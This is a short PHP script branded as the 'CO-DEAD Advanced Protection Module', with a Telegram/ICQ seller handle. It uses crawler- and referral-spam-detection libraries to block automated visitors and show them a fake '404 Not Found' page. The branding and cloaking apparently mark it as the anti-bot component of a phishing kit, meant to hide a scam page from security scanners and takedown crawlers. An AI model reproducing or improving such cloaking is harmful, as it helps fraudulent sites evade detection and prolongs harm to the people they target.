<?php

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 
require "CrawlerDetect/Fixtures/AbstractProvider.php";
require "CrawlerDetect/Fixtures/AbstractReff.php";
require "CrawlerDetect/Fixtures/Crawlers.php";
require "CrawlerDetect/Fixtures/Exclusions.php";
require "CrawlerDetect/Fixtures/Headers.php";
require "CrawlerDetect/Fixtures/Headerspam.php";
require "CrawlerDetect/Fixtures/SpamReferrers.php";
require "CrawlerDetect/CrawlerDetect.php";
require "CrawlerDetect/ReferralSpamDetect.php";
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;
$CrawlerDetect = new CrawlerDetect();
$referrer = new ReferralSpamDetect();
lnpsR:
if ($referrer->isReferralSpam()) {
    die(
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. Crawler Found</p></body></html>"
    );
}

if ($CrawlerDetect->isCrawler()) {
    die(
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. Crawler Found</p></body></html>"
    );
}
